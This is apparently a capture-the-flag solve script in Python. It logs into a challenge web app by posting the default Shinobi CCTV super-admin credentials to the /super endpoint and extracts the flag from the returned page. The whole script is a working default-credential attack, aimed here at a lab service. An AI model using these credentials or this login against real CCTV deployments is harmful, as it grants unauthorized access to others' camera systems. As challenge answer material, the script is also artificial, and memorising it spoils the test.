import os
import re

import requests

host = os.environ["SERVICE_APP_MAIN_HOST"]
port = os.environ["SERVICE_APP_MAIN_PORT"]
base = f"http://{host}:{port}"

# The custom "app.js" glue code (login-form copied from the real Shinobi CCTV
# product) never changed the well-known default Shinobi super-admin login
# (admin@shinobi.video / admin), exactly as the challenge description hints
# ("I didn't change anything"). Logging in with it renders the flag straight
# into the dashboard page.
resp = requests.post(
    f"{base}/super",
    data={"mail": "admin@shinobi.video", "pass": "admin"},
    timeout=10,
)
resp.raise_for_status()

match = re.search(r"<strong>(.*?)</strong>", resp.text, re.DOTALL)
if not match:
    raise SystemExit("Login failed, flag not found in response")

flag = match.group(1).strip()
print(flag)
